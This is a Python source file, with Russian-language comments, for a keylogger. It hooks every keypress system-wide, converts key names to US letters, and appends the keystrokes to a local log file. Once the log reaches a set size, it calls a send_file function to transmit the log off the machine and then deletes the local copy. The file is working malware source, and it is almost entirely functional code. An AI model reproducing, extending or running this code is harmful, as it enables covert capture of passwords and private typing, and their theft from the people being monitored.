import keyboard
from language_dict import dict_for_us_letter
from settings import get_input_language, send_file, size_file, size_my_file
import os
import sys


class MyKeyboardListener:
    def __init__(self):
        self.language_flag_us = False
        if get_input_language() == 1033:
            self.language_flag_us = True
        else:
            self.language_flag_us = False
        self.char_list = []

    def on_press(self, event):
        """Обрабатывает нажатые клавиши"""
        if self.language_flag_us:
            try:
                self.char_list.append(event.name)
            except (TypeError, AttributeError):
                pass
        else:
            try:
                char = dict_for_us_letter[event.name]
                self.char_list.append(char)
            except KeyError:
                pass
        if len(self.char_list) != 0:
            self.write_to_file()
        if size_file() >= size_my_file:
            try:
                send_file()
                if os.path.exists('keylloger_file.txt'):
                    os.remove('keylloger_file.txt')
            except TypeError:
                pass

    def write_to_file(self):
        """Записывает данные в файл"""
        with open('keylloger_file.txt', 'a') as my_file:
            text = ''.join(self.char_list)
            text = text.replace('space', ' ').replace('shift', '').replace('enter', '\n').replace('ctrl', '')
            my_file.write(text)
        self.char_list.clear()

    def switch_language_flag(self):
        """Меняет способ получения клавишь(меняет флаг на противоположный)"""
        if not self.language_flag_us:
            self.language_flag_us = True

        else:
            self.language_flag_us = False

    def on_ctrl_alt_f4_press(self):
        """Закрывает приложение"""
        sys.exit()


if __name__ == '__main__':
    listener = MyKeyboardListener()
    keyboard.add_hotkey('ctrl+shift', listener.switch_language_flag)
    keyboard.add_hotkey('ctrl+alt+f4', listener.on_ctrl_alt_f4_press)
    keyboard.on_press(listener.on_press)
    keyboard.wait()
